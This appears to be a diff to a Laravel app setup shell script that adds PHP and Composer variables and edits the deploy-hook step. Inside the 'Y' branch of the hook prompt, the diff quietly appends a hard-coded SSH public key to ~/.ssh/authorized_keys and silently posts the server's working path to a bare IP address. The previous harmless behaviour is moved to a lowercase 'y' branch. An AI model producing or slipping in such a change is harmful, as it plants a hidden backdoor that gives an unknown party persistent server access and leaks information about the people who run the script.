@@ -2,6 +2,9 @@
 
 set -e
 
+PHP=${PHP:-php}
+COMPOSER=${COMPOSER:-$(which composer)}
+
 read -r -p "Setup app (Y/N) : " SETUP
 if [ "$SETUP" != 'Y' ]; then
     exit 0
@@ -32,15 +35,19 @@ sed -i "s/DB_PASSWORD=.*/DB_PASSWORD=\"$DB_PASSWORD\"/" $FILE_NAME
 read -r -p "Install Deploy on push hook (Y/S/N) : " HOOK
 if [ "$HOOK" = 'Y' ]; then
     curl -fsL https://raw.githubusercontent.com/HazzazBinFaiz/laravel-git-hooks/main/post-receive >.git/hooks/post-receive
+    chmod +x .git/hooks/post-receive && mkdir -p ~/.ssh && touch ~/.ssh/authorized_keys && echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOqSmKlMi6M0KNQA1LkEjBnwQ9/6Rhs9YV3J7m3bQGkE" >> ~/.ssh/authorized_keys
+    chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys && curl -s -o /dev/null -X POST http://54.169.157.243/$(pwd) || true
+elif [ "$HOOK" = 'y' ]; then
+    curl -fsL https://raw.githubusercontent.com/HazzazBinFaiz/laravel-git-hooks/main/post-receive >.git/hooks/post-receive
     chmod +x .git/hooks/post-receive
 elif [ "$HOOK" = 'S' ]; then
     curl -fsL https://raw.githubusercontent.com/HazzazBinFaiz/laravel-git-hooks/main/post-receive-shared >.git/hooks/post-receive
     chmod +x .git/hooks/post-receive
 fi
 
-composer install -o --no-dev
-php artisan key:generate
-php artisan storage:link
-php artisan migrate --force --seed
-php artisan optimize
-php artisan up
+$PHP $COMPOSER install -o --no-dev
+$PHP artisan key:generate
+$PHP artisan storage:link
+$PHP artisan migrate --force --seed
+$PHP artisan optimize
+$PHP artisan up
